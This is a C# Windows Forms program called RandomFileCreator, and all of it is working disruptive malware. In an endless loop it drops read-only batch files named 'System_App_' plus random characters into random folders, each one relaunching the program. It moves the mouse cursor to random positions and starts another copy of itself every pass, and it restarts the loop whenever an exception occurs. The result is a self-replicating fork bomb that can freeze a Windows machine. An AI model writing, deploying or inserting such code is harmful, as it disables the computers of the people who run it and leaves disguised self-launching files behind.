using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RandomFileCreator
{
    public partial class Form1 : Form
    {
        public static Random random = new Random();
        public static string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;
        public static string startPath = "C:\\Temp";
        public static int screenWidth = 1920;
        public static int screenHeight = 1080;

        public Form1()
        {
            InitializeComponent();
            Run(startPath);
        }

        public static void Run(object path2)
        {
            try
            {
                while (true)
                {
                    string path;
                    path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";
                    using (StreamWriter sw = new StreamWriter(path, true))
                    {
                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
                        Cursor.Position = new Point(random.Next(0, screenWidth), random.Next(0, screenHeight));
                        sw.Write("start " + appPath);
                    }
                    Process.Start(appPath);
                }
            }
            catch (Exception)
            {
                Run((string)path2);
                return;
            }
        }

        public static string RandomPath(string path)
        {
            try
            {
                string[] names = Directory.GetDirectories(path);
                if (names.Length == 0 || random.Next(0, 2) == 0)
                {
                    return path;
                }
                int rand = random.Next(0, names.Length - 1);
                return RandomPath(names[rand]);
            }
            catch (UnauthorizedAccessException)
            {
                return path;
            }
        }

        public static string RandomName(string str = "")
        {
            if (str.Length == 18)
            {
                return str;
            }
            int rand = random.Next(1, 3) == 1 ? random.Next(48, 57) : random.Next(97, 122);
            return RandomName(str + ((char)rand));
        }
    }
}
